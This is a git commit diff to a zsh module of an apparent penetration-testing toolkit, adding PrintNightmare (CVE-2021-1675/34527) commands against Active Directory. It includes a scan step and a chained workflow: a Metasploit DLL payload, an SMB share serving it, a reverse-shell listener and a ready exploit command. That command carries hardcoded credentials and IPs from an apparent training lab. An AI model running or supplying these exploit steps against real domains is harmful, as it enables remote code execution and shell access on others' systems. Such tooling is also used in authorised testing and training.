4992567655c97461e4c02e2ede11c37aac2c7cc6
Twilight4 <electrolight071@proton.me>
2024-05-27 15:10:26 +0200

    update

--- modules/nb-ad-cve.zsh
+++ modules/nb-ad-cve.zsh
@@ -10,15 +10,16 @@ nb-ad-cve
 ----------
 The nb-ad-cve namespace provides commands for popular active direcory CVEs vulnerabilities and exploits.
 
-Commands
---------
-nb-ad-cve-printnightmare                  command to check for CVE-2021-34527 and CVE-2021-1675 vulnerability
+PrintNightmare
+--------------
+nb-ad-cve-printnightmare-install                   command to clone the github CVE repo install the cube0x0's version of impacket
+nb-ad-cve-printnightmare-scan                      command to check for CVE-2021-34527 and CVE-2021-1675 vulnerability
+nb-ad-cve-printnightmare-exploit                   command to exploit the PrintNightmare vulnerability 
 
 DOC
 }
 
-
-nb-ad-cve-printnightmare() {
+nb-ad-cve-printnightmare-install() {
     __check-project
 
     __ask "This will clone the cube0x0 CVE github repo to downloads, continue? (y/n)"
@@ -31,6 +32,7 @@ nb-ad-cve-printnightmare() {
       exit 1
     fi
 
+    echo
     __ask "This will uninstall current version of impacket and installcube0x0's version of Impacket, continue? (y/n)"
     local im && __askvar im ANSWER
 
@@ -44,4 +46,26 @@ nb-ad-cve-printnightmare() {
       __err "Operation cancelled by user"
       exit 1
     fi
+}
+
+nb-ad-cve-printnightmare-scan() {
+    __check-project
+    nb-vars-set-rhost
+
+    print -z "rpcdump.py @${__RHOST} | egrep 'MS-RPRN|MS-PAR'"
+
+    __info "If target is vulnerable, you can generate a dll payload:"
+    __ok "nb-shell-handlers-msf-payload"
+    __info "Then create a share with smbserver.py:"
+    __ok "sudo smbserver.py -smb2support CompData /path/to/backupscript.dll"
+    __info "Then configure & start msf multi/handler"
+    __ok "nb-shell-handlers-msf-listener"
+    __info "Then exploit the target with command:"
+    __ok "nb-ad-cve-printnightmare-exploit"
+}
+
+nb-ad-cve-printnightmare-exploit() {
+    _
+    nb-vars-set-rhost
+    print -z "sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'"
 }
